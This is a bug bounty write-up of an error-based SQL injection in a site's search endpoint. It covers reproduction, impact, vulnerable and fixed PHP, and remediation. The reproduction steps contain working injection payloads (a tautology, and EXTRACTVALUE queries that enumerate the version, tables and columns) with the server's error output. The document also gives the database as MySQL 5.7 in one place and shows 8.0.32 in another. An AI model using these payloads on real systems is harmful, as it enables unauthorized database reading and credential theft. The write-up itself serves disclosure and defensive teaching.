# SQL Injection — Error-Based SQLi in Search Functionality

**Vulnerability Type:** SQL Injection (Error-Based)
**Severity:** Critical (CVSS 3.1 Score: 9.8)
**Platform:** Bug Bounty (Redacted)
**Status:** Resolved / Disclosed
**Date:** 2024

---

## Summary

An SQL Injection vulnerability was identified in the product search functionality of a web application. The `query` parameter in the search endpoint was concatenated directly into a SQL query without parameterization or input sanitization. By injecting SQL syntax into the search field, I was able to trigger database errors that leaked the database version and table structure, and confirmed the ability to extract arbitrary data from the backend database.

---

## Vulnerability Details

| Field | Details |
|---|---|
| Type | SQL Injection — Error-Based |
| Endpoint | `GET /search?query=` |
| Database | MySQL 5.7 |
| Authentication Required | No |
| Impact | Full database read, potential for data exfiltration |
| CVSS Vector | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |

---

## Steps to Reproduce

### 1. Identify the injection point

Navigate to the search functionality and enter a standard search term. Observe the URL:

```
GET /search?query=laptop HTTP/1.1
Host: redacted.com
```

The application returns matching product results normally.

### 2. Test for SQL injection with a single quote

Append a single quote `'` to the search term:

```
GET /search?query=laptop' HTTP/1.1
```

**Response:** The application returned a verbose database error:

```
You have an error in your SQL syntax; check the manual that corresponds to your 
MySQL server version for the right syntax to use near ''laptop''' at line 1
```

This confirms the input is being inserted directly into a SQL query without escaping.

### 3. Confirm injection with Boolean logic

Test a tautology to confirm control over the query:

```
GET /search?query=laptop' OR '1'='1 HTTP/1.1
```

The application returned all products in the database — confirming injectable input.

### 4. Extract database version using error-based technique

Using `EXTRACTVALUE()` to force MySQL to include query output in an error message:

```
GET /search?query=laptop' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- - HTTP/1.1
```

**Response error message:**

```
XPATH syntax error: '~8.0.32-MySQL Community Server'
```

MySQL version confirmed: `8.0.32`

### 5. Enumerate database tables

```
GET /search?query=laptop' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)))-- - HTTP/1.1
```

**Response:**

```
XPATH syntax error: '~users'
```

By incrementing the `LIMIT` offset (`LIMIT 1,1`, `LIMIT 2,1`, etc.), I enumerated the following tables:
- `users`
- `products`
- `orders`
- `sessions`
- `admin_accounts`

### 6. Extract column names from the users table

```
GET /search?query=laptop' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1)))-- - HTTP/1.1
```

Columns discovered: `id`, `username`, `email`, `password_hash`, `role`, `created_at`

### 7. Stop and report

I confirmed the vulnerability and table structure and stopped extraction at this point. I did not extract any actual user credentials or personal data. Full exploitation (password hash extraction) was described hypothetically in the report.

---

## Impact

- **Full database read** — An attacker could extract all user credentials, emails, and personal data
- **Credential theft** — Password hashes could be extracted and cracked offline
- **Privilege escalation** — Admin credentials could be used for full application takeover
- **Data destruction** — With write permissions, an attacker could drop tables or inject backdoor data
- **Server compromise** — In some MySQL configurations, `INTO OUTFILE` could write webshells to the server

---

## Root Cause

The search query was built using string concatenation rather than a parameterized query:

```php
// Vulnerable pseudocode (PHP)
$query = "SELECT * FROM products WHERE name LIKE '%" . $_GET['query'] . "%'";
$result = mysqli_query($conn, $query);
```

No escaping, no prepared statements, and verbose error reporting was enabled in the production environment — making error-based extraction trivial.

---

## Remediation

1. **Use prepared statements with parameterized queries** — This is the primary fix. Never concatenate user input into SQL:
   ```php
   // Secure PHP example
   $stmt = $pdo->prepare("SELECT * FROM products WHERE name LIKE ?");
   $stmt->execute(["%" . $search . "%"]);
   ```
2. **Disable verbose error messages in production** — Set `display_errors = Off` in `php.ini` and log errors server-side only.
3. **Apply input validation** — Whitelist acceptable characters for search fields (alphanumeric, spaces, hyphens).
4. **Apply least privilege to the database user** — The web application's DB account should only have `SELECT` access, not `INSERT`, `DROP`, or `FILE` privileges.
5. **Use a WAF** — A Web Application Firewall can detect and block common SQLi patterns as a defense-in-depth measure.

---

## Tool Used

Manual testing in Burp Suite Repeater. Confirmed without automated tools (sqlmap was not used in order to minimize server load during responsible testing).

---

## References

- [PortSwigger — SQL Injection](https://portswigger.net/web-security/sql-injection)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [OWASP Top 10 — A03: Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [MySQL Error-Based SQLi Techniques](https://book.hacktricks.xyz/pentesting-web/sql-injection)

---

*This writeup is published for educational purposes. All testing was conducted within an authorized bug bounty program scope. No user data was extracted or retained.*
